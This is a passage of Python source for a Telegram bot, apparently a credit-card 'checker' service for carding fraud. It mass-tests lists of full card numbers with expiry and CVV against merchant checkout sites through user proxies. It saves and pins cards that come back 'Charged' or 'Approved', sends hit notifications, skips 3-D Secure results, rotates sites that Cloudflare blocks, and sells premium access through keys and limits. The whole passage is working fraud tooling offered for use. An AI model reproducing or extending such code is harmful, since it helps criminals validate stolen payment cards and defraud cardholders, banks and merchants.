        msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {res.get('Gateway', 'Unknown')}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {res.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {res.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {site_index}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝗸 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"""

        await loading_msg.delete()
        result_msg = await event.reply(msg)
        if is_charged:
            await pin_charged_message(event, result_msg)
            is_private = event.chat.id == event.sender_id
            if is_private:
                await send_hit_notification(client, card, res, username, event.sender_id)
        elif status == "Approved":
            is_private = event.chat.id == event.sender_id
            if is_private:
                await send_hit_notification(client, card, res, username, event.sender_id)
    except Exception as e:
        loading_task.cancel()
        await loading_msg.delete()
        await event.reply(f"❌ Error: {e}")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh'))
async def msh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("Use In Group Free", f"https://t.me/+4TU0Rp4zCfowZDg9")]]
        return await event.reply("🚫 Unauthorised Access!\n\nYou can use this bot in group for free!\n\nFor private access, contact @ArxisX", buttons=buttons)

    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ Proxy Required!\n\nPlease add a proxy first using:\n`/addpxy ip:port:username:password`\n\nOr without auth:\n`/addpxy ip:port`")

    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            cards = extract_all_cards(replied_msg.text)
        if not cards:
            return await event.reply("Couldn't extract valid cards from replied message\n\nFormat: /msh 4111111111111111|12|2025|123 4111111111111111|12|2025|123")
    else:
        cards = extract_all_cards(event.raw_text)
        if not cards:
            return await event.reply("Format: /msh 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\nOr reply to a message containing multiple cards")

    if len(cards) > 20:
        cards = cards[:20]
        await event.reply(f"```⚠️ Only checking first 20 cards. Limit is 20 cards for /msh.```")

    await ensure_user(event.sender_id)
    user_sites = await get_user_sites(event.sender_id)
    if not user_sites:
        return await event.reply("You haven't added any URLs. First add using /add")

    user_id = event.sender_id
    buttons = [
        [Button.inline("✅ Yes (Charged + Approved)", f"msh_pref:yes:{user_id}".encode())],
        [Button.inline("💎 No (Only Charged)", f"msh_pref:no:{user_id}".encode())]
    ]

    pref_msg = await event.reply(
        "**Do you need approved cards?**\n\n"
        "_Yes: Sends both Charged and Approved cards._\n"
        "_No: Sends only Charged cards._",
        buttons=buttons
    )

    USER_APPROVED_PREF[f"msh_{user_id}"] = {
        "cards": cards,
        "sites": user_sites,
        "event": event,
        "pref_msg": pref_msg
    }


@client.on(events.CallbackQuery(pattern=rb"msh_pref:(yes|no):(\d+)"))
async def msh_pref_callback(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    user_id = int(match.group(2).decode())

    if event.sender_id != user_id:
        return await event.answer("❌ This is not your session!", alert=True)

    key = f"msh_{user_id}"
    data = USER_APPROVED_PREF.pop(key, None)
    if not data:
        return await event.answer("❌ Session expired! Please try again.", alert=True)

    send_approved = (pref == "yes")

    try:
        await data["pref_msg"].delete()
    except Exception:
        pass

    await event.answer("Starting check...", alert=False)
    asyncio.create_task(process_msh_cards(data["event"], data["cards"], data["sites"], send_approved))


async def process_msh_cards(event, cards, sites, send_approved=True):
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except Exception:
        username = f"user_{event.sender_id}"

    mode_text = "Charged + Approved" if send_approved else "Only Charged"
    sent_msg = await event.reply(f"```Something Big Cooking 🍳 {len(cards)} Total. Mode: {mode_text}```")
    current_site_index = 0
    is_private = event.chat.id == event.sender_id
    BATCH_SIZE = 30

    for batch_start in range(0, len(cards), BATCH_SIZE):
        batch = cards[batch_start:batch_start + BATCH_SIZE]

        tasks = []
        batch_sites = []
        for card in batch:
            current_site = sites[current_site_index % len(sites)]
            batch_sites.append((current_site, current_site_index % len(sites) + 1))
            tasks.append(check_card_specific_with_retry(card, current_site, event.sender_id, all_sites=sites, max_retries=3))
            current_site_index += 1

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for i, (card, result) in enumerate(zip(batch, results)):
            if isinstance(result, Exception):
                result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-", "Status": "Error"}

            status = result.get("Status", "Declined")
            response_text_lower = result.get("Response", "").lower()
            site_info = batch_sites[i]

            if "cloudflare" in response_text_lower:
                status_header = "CLOUDFLARE SPOTTED ⚠️"
                result["Response"] = "Cloudflare spotted 🤡 change site or try again"
                is_charged = False
            elif status in ["Error", "SiteError"]:
                status_header = "~~ ERROR ~~ ⚠️"
                is_charged = False
            else:
                status_header = get_status_header(status)
                is_charged = (status == "Charged")

            if status == "Charged":
                await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif status == "Approved":
                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))

            should_send = False
            if status == "Charged":
                should_send = True
            elif status == "Approved" and send_approved:
                should_send = True
            elif status in ["Declined", "Error", "SiteError"]:
                should_send = True

            if should_send:
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {result.get('Gateway', 'Unknown')}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {result.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {result.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {site_info[1]}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```
"""
                result_msg = await event.reply(card_msg)
                if is_charged:
                    await pin_charged_message(event, result_msg)
                    if is_private:
                        await send_hit_notification(client, card, result, username, event.sender_id)
                elif status == "Approved" and is_private:
                    await send_hit_notification(client, card, result, username, event.sender_id)

    await sent_msg.edit(f"```✅ Mass Check Complete! Processed {len(cards)} cards.```")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt$'))
async def mtxt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("Use In Group Free", f"https://t.me/+4TU0Rp4zCfowZDg9")]]
        return await event.reply("🚫 Unauthorised Access!\n\nYou can use this bot in group for free!\n\nFor private access, contact @ArxisX", buttons=buttons)

    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ Proxy Required!\n\nPlease add a proxy first using:\n`/addpxy ip:port:username:password`\n\nOr without auth:\n`/addpxy ip:port`")

    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES:
        return await event.reply("```Your CC is already Cooking 🍳 wait for complete```")
    try:
        if not event.reply_to_msg_id:
            return await event.reply("```Please reply to a document message with /mtxt```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document:
            return await event.reply("```Please reply to a document message with /mtxt```")
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f:
                lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try:
                os.remove(file_path)
            except Exception:
                pass
            return await event.reply(f"❌ Error reading file: {e}")
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards:
            return await event.reply("Any Valid CC not Found 🥲")
        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 Found {total_cards_found} CCs in file
⚠️ Processing only first {cc_limit} CCs (your limit)
🔥 {len(cards)} CCs will be checked```""")
        else:
            await event.reply(f"""```📝 Found {total_cards_found} valid CCs in file
🔥 All {len(cards)} CCs will be checked```""")

        await ensure_user(event.sender_id)
        user_sites = await get_user_sites(event.sender_id)
        if not user_sites:
            return await event.reply("Site Not Found In Your Db")

        buttons = [
            [Button.inline("✅ Yes (Charged + Approved)", f"mtxt_pref:yes:{user_id}".encode())],
            [Button.inline("💎 No (Only Charged)", f"mtxt_pref:no:{user_id}".encode())]
        ]

        pref_msg = await event.reply(
            "**Do you need approved cards?**\n\n"
            "_Yes: Sends both Charged and Approved cards._\n"
            "_No: Sends only Charged cards._",
            buttons=buttons
        )

        USER_APPROVED_PREF[f"mtxt_{user_id}"] = {
            "cards": cards,
            "sites": user_sites.copy(),
            "event": event,
            "pref_msg": pref_msg
        }

    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ Error: {e}")


@client.on(events.CallbackQuery(pattern=rb"mtxt_pref:(yes|no):(\d+)"))
async def mtxt_pref_callback(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    user_id = int(match.group(2).decode())

    if event.sender_id != user_id:
        return await event.answer("❌ This is not your session!", alert=True)

    key = f"mtxt_{user_id}"
    data = USER_APPROVED_PREF.pop(key, None)
    if not data:
        return await event.answer("❌ Session expired! Please try again.", alert=True)

    send_approved = (pref == "yes")

    try:
        await data["pref_msg"].delete()
    except Exception:
        pass

    if user_id in ACTIVE_MTXT_PROCESSES:
        return await event.answer("❌ Already running!", alert=True)

    ACTIVE_MTXT_PROCESSES[user_id] = True
    await event.answer("Starting check...", alert=False)
    asyncio.create_task(process_mtxt_cards(data["event"], data["cards"], data["sites"], send_approved))


async def process_mtxt_cards(event, cards, local_sites, send_approved=True):
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except Exception:
        username = f"user_{event.sender_id}"

    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined, errors = 0, 0, 0, 0, 0
    is_private = event.chat.id == event.sender_id
    mode_text = "Charged + Approved" if send_approved else "Only Charged"
    status_msg = await event.reply(f"```Something Big Cooking 🍳 Mode: {mode_text}```")
    current_site_index = 0
    BATCH_SIZE = 30
    last_card_display = ""
    last_response_display = ""
    last_site_display = ""

    try:
        idx = 0
        while idx < total:
            if not local_sites:
                await status_msg.edit("❌ **All your sites are dead!**\nPlease add fresh sites using `/add` and try again.")
                break

            if user_id not in ACTIVE_MTXT_PROCESSES:
                final_caption = f"""⛔ Checking Stopped!
Total CHARGE 💎 : {charged}
Total Approve 🔥 : {approved}
Total Decline ❌ : {declined}
Total Errors ⚠️ : {errors}
Total Checked ☠️ : {checked}/{total}
"""
                final_buttons = [
                    [Button.inline(f"CHARGE ➜ [ {charged} ] 💎", b"none")],
                    [Button.inline(f"Approve ➜ [ {approved} ] 🔥", b"none")],
                    [Button.inline(f"Stop ➜ [{checked}/{total}] ⛔", b"none")]
                ]
                try:
                    await status_msg.edit(final_caption, buttons=final_buttons)
                except Exception:
                    pass
                return

            batch = cards[idx:idx + BATCH_SIZE]

            tasks = []
            batch_sites = []
            for card in batch:
                if not local_sites:
                    break
                current_site = local_sites[current_site_index % len(local_sites)]
                site_idx = current_site_index % len(local_sites) + 1
                batch_sites.append((current_site, site_idx))
                tasks.append(check_card_specific_with_retry(card, current_site, user_id, all_sites=local_sites, max_retries=3))
                current_site_index += 1

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for i, (card, result) in enumerate(zip(batch, results)):
                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-", "Status": "Error"}

                checked += 1
                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()
                status = result.get("Status", "Declined")

                current_site_info = batch_sites[i] if i < len(batch_sites) else ("?", "?")
                current_site = current_site_info[0]
                display_site_index = current_site_info[1]

                last_card_display = f"{card[:12]}****"
                last_response_display = result.get('Response', '')[:25]
                last_site_display = display_site_index

                if status in ["SiteError", "Error"]:
                    errors += 1
                    if is_site_error(response_text) and current_site in local_sites:
                        local_sites.remove(current_site)
                        # Also remove from DB
                        await remove_site_db(user_id, current_site)
                        current_site_index = 0

                    if not local_sites:
                        final_caption = f"""⛔ **All sites are dead!**
Please add fresh sites using `/add` and try again.

Total CHARGE 💎 : {charged}
Total Approve 🔥 : {approved}
Total Decline ❌ : {declined}
Total Errors ⚠️ : {errors}
Total Checked ☠️ : {checked}/{total}
"""
                        final_buttons = [
                            [Button.inline(f"CHARGE ➜ [ {charged} ] 💎", b"none")],
                            [Button.inline(f"Approve ➜ [ {approved} ] 🔥", b"none")],
                            [Button.inline(f"Dead Sites! ➜ [{checked}/{total}] ⛔", b"none")]
                        ]
                        try:
                            await status_msg.edit(final_caption, buttons=final_buttons)
                        except Exception:
                            pass
                        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
                        return
                    continue

                if "3d" in response_text_lower:
                    declined += 1
                    continue

                if "cloudflare" in response_text_lower:
                    checked -= 1
                    errors += 1
                    continue

                should_send_message = False

                if status == "Charged":
                    charged += 1
                    status_header = get_status_header(status)
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif status == "Approved":
                    approved += 1
                    status_header = get_status_header(status)
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    if send_approved:
                        should_send_message = True
                else:
                    declined += 1
                    status_header = get_status_header(status)

                if should_send_message:
                    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                    card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {result.get('Gateway', 'Unknown')}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {result.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {result.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {display_site_index}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```
"""
                    result_msg = await event.reply(card_msg)
                    if status == "Charged":
                        await pin_charged_message(event, result_msg)
                        if is_private:
                            await send_hit_notification(client, card, result, username, event.sender_id)
                    elif status == "Approved" and is_private:
                        await send_hit_notification(client, card, result, username, event.sender_id)

            buttons = [
                [Button.inline(f"Card ➜ {last_card_display}", b"none")],
                [Button.inline(f"Response ➜ {last_response_display}...", b"none")],
                [Button.inline(f"Site ➜ [ {last_site_display} ]", b"none")],
                [Button.inline(f"CHARGE ➜ [ {charged} ] 💎", b"none")],
                [Button.inline(f"Approve ➜ [ {approved} ] 🔥", b"none")],
                [Button.inline(f"Decline ➜ [ {declined} ] ❌", b"none")],
                [Button.inline(f"Errors ➜ [ {errors} ] ⚠️", b"none")],
                [Button.inline(f"Progress ➜ [{checked}/{total}] ✅", b"none")],
                [Button.inline("⛔ Stop", f"stop_mtxt:{user_id}".encode())]
            ]
            try:
                await status_msg.edit("```Cooking 🍳 CCs in Batches of 20...```", buttons=buttons)
            except Exception:
                pass

            idx += len(batch)

        final_caption = f"""✅ Checking Complete!
Total CHARGE 💎 : {charged}
Total Approve 🔥 : {approved}
Total Decline ❌ : {declined}
Total Errors ⚠️ : {errors}
Total Checked ☠️ : {total}
"""
        final_buttons = [
            [Button.inline(f"CHARGE ➜ [ {charged} ] 💎", b"none")],
            [Button.inline(f"Approve ➜ [ {approved} ] 🔥", b"none")],
            [Button.inline(f"Total ➜ [{total}] ☠️", b"none")],
            [Button.inline(f"Total Checked ➜ [{checked}/{total}] ✅", b"none")]
        ]
        try:
            await status_msg.edit(final_caption, buttons=final_buttons)
        except Exception:
            pass
    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)


@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
async def stop_mtxt_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id:
            can_stop = True
        elif clicking_user_id in ADMIN_ID:
            can_stop = True
        if not can_stop:
            return await event.answer("```❌ You can only stop your own process!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES:
            return await event.answer("```❌ No active process found!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ CC checking stopped!```", alert=True)
    except Exception as e:
        await event.answer(f"```❌ Error: {str(e)}```", alert=True)


@client.on(events.NewMessage(pattern='/info'))
async def info(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())

    user = await event.get_sender()
    user_id = event.sender_id
    first_name = user.first_name or "N/A"
    last_name = user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "N/A"

    has_premium = await is_premium_user(user_id)
    premium_status = "✅ Premium Access" if has_premium else "❌ No Premium Access"

    user_sites = await get_user_sites(user_id)

    if user_sites:
        sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites)])
    else:
        sites_text = "No sites added"

    info_text = f"""👤 User Information

Name -> {full_name}
Username -> {username}
User ID -> `{user_id}`
Private Access -> {premium_status}

Sites ⇾ ({len(user_sites)}):
{sites_text}
"""

    await event.reply(info_text)


@client.on(events.NewMessage(pattern='/stats'))
async def stats(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!")

    try:
        total_users = await get_total_users()
        total_premium = await get_premium_count()
        total_free = total_users - total_premium
        total_sites = await get_total_sites_count()
        users_with_sites = await get_users_with_sites()
        all_keys = await get_all_keys()
        total_keys = len(all_keys)
        used_keys = len([k for k in all_keys if k.get('used', False)])
        unused_keys = total_keys - used_keys
        total_cards = await get_total_cards_count()
        charged_cards = await get_charged_count()
        approved_cards = await get_approved_count()

        premium_users = await get_all_premium_users()
        sites_per_user = await get_sites_per_user()
        all_sites_detail = await get_all_sites_detail()

        stats_content = "🔥 BOT STATISTICS REPORT 🔥\n"
        stats_content += "=" * 50 + "\n\n"

        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stats_content += f"📅 Generated on: {current_time}\n\n"

        stats_content += "👥 USER STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"📊 Total Unique Users: {total_users}\n"
        stats_content += f"💎 Premium Users: {total_premium}\n"
        stats_content += f"🆓 Free Users: {total_free}\n\n"

        if premium_users:
            stats_content += "💎 PREMIUM USERS DETAILS\n"
            stats_content += "-" * 30 + "\n"
            for user_row in premium_users:
                uid = user_row['user_id']
                expiry_date = user_row['expiry']
                current_date = datetime.datetime.utcnow()
                if expiry_date:
                    status_str = "ACTIVE" if current_date <= expiry_date else "EXPIRED"
                    days_remaining = (expiry_date - current_date).days if current_date <= expiry_date else 0
                else:
                    status_str = "NO EXPIRY"
                    days_remaining = 0
                stats_content += f"User ID: {uid}\n"
                stats_content += f"  Status: {status_str}\n"
                stats_content += f"  Days Given: {user_row.get('premium_days', 'N/A')}\n"
                stats_content += f"  Expires: {expiry_date}\n"
                stats_content += f"  Days Remaining: {days_remaining}\n"
                stats_content += "-" * 20 + "\n"

        stats_content += "\n🌐 SITES STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"📈 Total Sites Added: {total_sites}\n"
        stats_content += f"👤 Users with Sites: {users_with_sites}\n"

        if sites_per_user:
            stats_content += f"\nSites per User:\n"
            for row in sites_per_user:
                stats_content += f"  User {row['user_id']}: {row['cnt']} sites\n"

        if all_sites_detail:
            current_uid = None
            for row in all_sites_detail:
                if row['user_id'] != current_uid:
                    current_uid = row['user_id']
                    stats_content += f"\n  User {current_uid}:\n"
                stats_content += f"    - {row['site']}\n"

        stats_content += f"\n🔑 KEYS STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"🔢 Total Keys Generated: {total_keys}\n"
        stats_content += f"✅ Used Keys: {used_keys}\n"
        stats_content += f"⏳ Unused Keys: {unused_keys}\n"

        if all_keys:
            stats_content += f"\nKeys Details:\n"
            for key_row in all_keys:
                kstatus = "USED" if key_row.get('used', False) else "UNUSED"
                stats_content += f"  Key: {key_row['key']}\n"
                stats_content += f"    Status: {kstatus}\n"
                stats_content += f"    Days Value: {key_row.get('days', 'N/A')}\n"
                stats_content += f"    Created: {key_row.get('created_at', 'N/A')}\n"
                if kstatus == "USED":
                    stats_content += f"    Used By: {key_row.get('used_by', 'N/A')}\n"
                    stats_content += f"    Used At: {key_row.get('used_at', 'N/A')}\n"
                stats_content += "-" * 15 + "\n"

        stats_content += f"\n👑 ADMIN STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"🛡️ Total Admins: {len(ADMIN_ID)}\n"
        stats_content += f"Admin IDs: {', '.join(map(str, ADMIN_ID))}\n"

        stats_content += f"\n💳 CARD STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"📊 Total Processed Cards: {total_cards}\n"
        stats_content += f"✅ Approved Cards: {approved_cards}\n"
        stats_content += f"💎 Charged Cards: {charged_cards}\n"

        stats_content += "\n" + "=" * 50 + "\n"
        stats_content += "📋 END OF REPORT 📋"

        stats_filename = f"bot_stats_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(stats_filename, "w", encoding="utf-8") as f:
            await f.write(stats_content)

        await event.reply("📊 Bot statistics report generated!", file=stats_filename)

        os.remove(stats_filename)

    except Exception as e:
        await event.reply(f"❌ Error generating stats: {e}")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran$'))
async def ranfor(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("Use In Group Free", f"https://t.me/+4TU0Rp4zCfowZDg9")]]
        return await event.reply("🚫 Unauthorised Access!\n\nYou can use this bot in group for free!\n\nFor private access, contact @ArxisX", buttons=buttons)

    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ Proxy Required!\n\nPlease add a proxy first using:\n`/addpxy ip:port:username:password`\n\nOr without auth:\n`/addpxy ip:port`")

    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES:
        return await event.reply("```Your CC is already Cooking 🍳 wait for complete```")
    try:
        if not event.reply_to_msg_id:
            return await event.reply("```Please reply to a document message with /ran```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document:
            return await event.reply("```Please reply to a document message with /ran```")

        if not os.path.exists('sites.txt'):
            return await event.reply("❌ Sites file not found! Contact admin.")

        async with aiofiles.open('sites.txt', 'r') as f:
            sites_content = await f.read()
            global_sites = [line.strip() for line in sites_content.splitlines() if line.strip()]

        if not global_sites:
            return await event.reply("❌ No sites available in sites.txt! Contact admin.")

        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f:
                lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try:
                os.remove(file_path)
            except Exception:
                pass
            return await event.reply(f"❌ Error reading file: {e}")
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards:
            return await event.reply("Any Valid CC not Found 🥲")
        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 Found {total_cards_found} CCs in file
⚠️ Processing only first {cc_limit} CCs (your limit)
🔥 {len(cards)} CCs will be checked```""")
        else:
            await event.reply(f"""```📝 Found {total_cards_found} valid CCs in file
🔥 All {len(cards)} CCs will be checked```""")

        buttons = [
            [Button.inline("✅ Yes (Charged + Approved)", f"ran_pref:yes:{user_id}".encode())],
            [Button.inline("💎 No (Only Charged)", f"ran_pref:no:{user_id}".encode())]
        ]

        pref_msg = await event.reply(
            "**Do you need approved cards?**\n\n"
            "_Yes: Sends both Charged and Approved cards._\n"
            "_No: Sends only Charged cards._",
            buttons=buttons
        )

        USER_APPROVED_PREF[f"ran_{user_id}"] = {
            "cards": cards,
            "sites": global_sites.copy(),
            "event": event,
            "pref_msg": pref_msg
        }

    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ Error: {e}")


@client.on(events.CallbackQuery(pattern=rb"ran_pref:(yes|no):(\d+)"))
async def ran_pref_callback(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    user_id = int(match.group(2).decode())

    if event.sender_id != user_id:
        return await event.answer("❌ This is not your session!", alert=True)

    key = f"ran_{user_id}"
    data = USER_APPROVED_PREF.pop(key, None)
    if not data:
        return await event.answer("❌ Session expired! Please try again.", alert=True)

    send_approved = (pref == "yes")

    try:
        await data["pref_msg"].delete()
    except Exception:
        pass

    if user_id in ACTIVE_MTXT_PROCESSES:
        return await event.answer("❌ Already running!", alert=True)

    ACTIVE_MTXT_PROCESSES[user_id] = True
    await event.answer("Starting check...", alert=False)
    asyncio.create_task(process_ranfor_cards(data["event"], data["cards"], data["sites"], send_approved))


async def process_ranfor_cards(event, cards, global_sites, send_approved=True):
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except Exception:
        username = f"user_{event.sender_id}"

    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined, errors = 0, 0, 0, 0, 0
    is_private = event.chat.id == event.sender_id
    mode_text = "Charged + Approved" if send_approved else "Only Charged"
    status_msg = await event.reply(f"```Something Big Cooking 🍳 Mode: {mode_text}```")
    BATCH_SIZE = 30
    last_card_display = ""
    last_response_display = ""

    try:
        idx = 0
        while idx < total:
            if not global_sites:
                await status_msg.edit("❌ **All sites are dead!**\nPlease contact admin to add fresh sites.")
                break

            if user_id not in ACTIVE_MTXT_PROCESSES:
                final_caption = f"""⛔ Checking Stopped!
Total CHARGE 💎 : {charged}
Total Approve 🔥 : {approved}
Total Decline ❌ : {declined}
Total Errors ⚠️ : {errors}
Total Checked ☠️ : {checked}/{total}
"""
                final_buttons = [
                    [Button.inline(f"CHARGE ➜ [ {charged} ] 💎", b"none")],
                    [Button.inline(f"Approve ➜ [ {approved} ] 🔥", b"none")],
                    [Button.inline(f"Stop ➜ [{checked}/{total}] ⛔", b"none")]
                ]
                try:
                    await status_msg.edit(final_caption, buttons=final_buttons)
                except Exception:
                    pass
                return

            batch = cards[idx:idx + BATCH_SIZE]

            tasks = []
            for card in batch:
                if not global_sites:
                    break
                site = random.choice(global_sites)
                tasks.append(check_card_with_retries_ranfor(card, site, user_id, global_sites))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for i, (card, result) in enumerate(zip(batch, results)):
                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-", "Status": "Error"}

                checked += 1
                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()
                status = result.get("Status", "Declined")

                last_card_display = f"{card[:12]}****"
                last_response_display = result.get('Response', '')[:25]

                if status in ["SiteError", "Error"]:
                    errors += 1
                    continue

                if "3d" in response_text_lower:
                    declined += 1
                    continue

                if "cloudflare" in response_text_lower:
                    checked -= 1
                    errors += 1
                    continue

                should_send_message = False

                if status == "Charged":
                    charged += 1
                    status_header = get_status_header(status)
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True
                elif status == "Approved":
                    approved += 1
                    status_header = get_status_header(status)
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    if send_approved:
                        should_send_message = True
                else:
                    declined += 1
                    status_header = get_status_header(status)

                if should_send_message:
                    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                    card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {result.get('Gateway', 'Unknown')}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {result.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {result.get('Price')} 💸

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```
"""
                    result_msg = await event.reply(card_msg)
                    if status == "Charged":
                        await pin_charged_message(event, result_msg)
                        if is_private:
                            await send_hit_notification(client, card, result, username, event.sender_id)
                    elif status == "Approved" and is_private:
                        await send_hit_notification(client, card, result, username, event.sender_id)

            buttons = [
                [Button.inline(f"Card ➜ {last_card_display}", b"none")],
                [Button.inline(f"Response ➜ {last_response_display}...", b"none")],
                [Button.inline(f"CHARGE ➜ [ {charged} ] 💎", b"none")],
                [Button.inline(f"Approve ➜ [ {approved} ] 🔥", b"none")],
                [Button.inline(f"Decline ➜ [ {declined} ] ❌", b"none")],
                [Button.inline(f"Errors ➜ [ {errors} ] ⚠️", b"none")],
                [Button.inline(f"Progress ➜ [{checked}/{total}] ✅", b"none")],
                [Button.inline("⛔ Stop", f"stop_ranfor:{user_id}".encode())]
            ]
            try:
                await status_msg.edit("```Cooking 🍳 CCs in Batches of 20...```", buttons=buttons)
            except Exception:
                pass

            idx += len(batch)

        final_caption = f"""✅ Checking Complete!
